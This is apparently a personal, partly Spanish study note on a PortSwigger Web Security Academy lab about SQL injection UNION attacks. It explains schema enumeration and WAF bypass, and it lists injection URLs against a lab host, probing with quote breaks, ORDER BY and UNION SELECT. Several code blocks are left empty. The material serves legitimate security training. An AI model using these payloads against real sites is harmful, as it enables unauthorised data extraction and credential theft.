# `Lab`: SQL injection UNION attack, retrieving data from other tables

- [Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

## Descripción:

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a **SQL injection UNION attack** that retrieves all usernames and passwords, and use the information to log in as the `administrator` user. 

---

### Explicación:

- En este laboratorio ya se acerca a un escenario "real" donde a partir del SQLi debo exfiltrar datos que contengan un `username` y `password`
- Para hacer esto, en realidad ya debo **enumerar** la base de datos o `database schema`, incluyendo `data bases`, `tables`, `columns` y `data`.
- Aquí es donde ya se pueden comenzar a hacer `DIOS - Dump In One Shot` y ese tipo de travesuras.
- A travez de `querys SQL` es como debo manipular las consultas para arrojar la información que yo necesite para enumerar la `database`.
- En caso que haya `WAF - Web Application Firewall` las querys se deben manipular con diferentes tecnicas de `ofuscation`, `encoding`, etc. para lograr hacer `bypass` de ese `WAF`. _(En este laboratiorio no hay WAF)_ 

#### Query original:

````sql

````

#### Query inyectada:

````sql

````

---

### Explicación con Lab:

1.

````sql

````
````py

````



## Solución:

````py
https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories

https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' 

https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' -- -

https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' ORDER BY 2 -- -

https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' UNION SELECT 1,2 -- -

# Working!!! Invisible
https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' UNION SELECT null,null -- -
# Working!!! Visible
https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' UNION SELECT '1','2' -- -




````










